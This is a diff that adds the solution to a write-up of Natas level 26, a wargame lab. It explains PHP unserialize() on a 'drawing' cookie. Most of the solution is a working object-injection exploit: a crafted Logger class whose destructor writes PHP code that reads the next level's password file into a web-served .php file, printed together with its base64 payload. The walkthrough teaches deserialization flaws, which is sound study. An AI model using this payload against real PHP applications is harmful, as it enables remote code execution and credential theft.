@@ -133,3 +133,110 @@ Y2<input type="text" name="y2" size=2>
 <br/>
 
 ## Solution
+
+There is lot of code to go through and most of it is concerned with drawing the image according to provided coordinates.
+
+If we leave out function declarations, the PHP that gets executes is at the bottom. App either needs the coordinates or `drawing` cookie.
+
+The application draws lines either by coordinates provided or by deserializing the `drawing` cookie.
+> `unserialize function in code should always be tested throroughly`
+
+>What is Serialization?<br/>
+>Serialization is when an object in a programming language is converted into a format that can be stored or transferred. Whereas deserialization is the opposite,  it’s when the serialized object is read from a file or the network and converted back into an object.
+
+
+Lets deserialize the cookie:
+```php
+<?php
+
+$drawing = unserialize(base64_decode("YToyOntpOjA7YTo0OntzOjI6IngxIjtzOjM6IjEwMCI7czoyOiJ5MSI7czoxOiIwIjtzOjI6IngyIjtzOjM6IjMwMCI7czoyOiJ5MiI7czozOiIzMDAiO31pOjE7YTo0OntzOjI6IngxIjtzOjM6IjEwMCI7czoyOiJ5MSI7czoxOiIwIjtzOjI6IngyIjtzOjM6IjMwMCI7czoyOiJ5MiI7czozOiIzMDAiO319"));
+
+print_r($drawing);
+```
+
+Output
+
+```
+$ php drawing.php
+Array
+(
+    [0] => Array
+        (
+            [x1] => 100
+            [y1] => 0
+            [x2] => 300
+            [y2] => 300
+        )
+
+    [1] => Array
+        (
+            [x1] => 100
+            [y1] => 0
+            [x2] => 300
+            [y2] => 300
+        )
+
+)
+```
+
+After deserializing the `drawing` cookie, we get an array of coordinates used to create the lines.
+
+In case of serialization bugs, we take advantage of the constructor and destructor function that runs when an object is created or destroyed.
+
+Lets look at the Logger class, both constructor and destructor .i.e. `__construct` and `__destruct` function write to a file . They write the contents of variable `initMsg` and `exitMsg` to the file. Lets create an object 
+
+```php
+<?php
+
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    
+    function __construct(){
+        $this->initMsg="Serialization Buggs!!!\n";
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
+        $this->logFile = "/var/www/natas/natas26/img/log.txt";
+    }
+}
+
+$o = new Logger();
+print base64_encode(serialize($o))."\n";
+```
+
+Output
+```
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbG9nLnR4dCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIzOiJTZXJpYWxpemF0aW9uIEJ1Z2dzISEhCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30=
+```
+
+Observations:
+  - We get the contents of the file storing password for next Level
+  - we can write to `img` directory, so we store log file there.
+
+We send a Logger object into a function that’s expecting arrays with coordinates, so this will give an error. But our exploit works because the objected is loaded into the `$drawing` variable, so when its life ends, the destructor will be called and that's all we need.
+
+Below we send our serialized object as cookie. (appended %3D for = )
+
+![](./images/Level26_solution.png)
+
+Now, lets access the file that we wrote
+
+![](./images/Level26.1_solution.png)
+
+
+We can see that our file gets written with our code but doesn't execute, let change `.txt` to `.php` in our serialized object and recreate it and that will execute to present the password for next level.
+
+![](./images/Level26.2_solution.png)
+
+<br/>
+<span id=green>**Takeaway**</span><br/>
+
+  - <br/>
+  - <br/>
+
+<br/>
+That's Level 26 
+
+<br/>
+
+[<< Back](https://grey-fish.github.io/Natas/index.html)
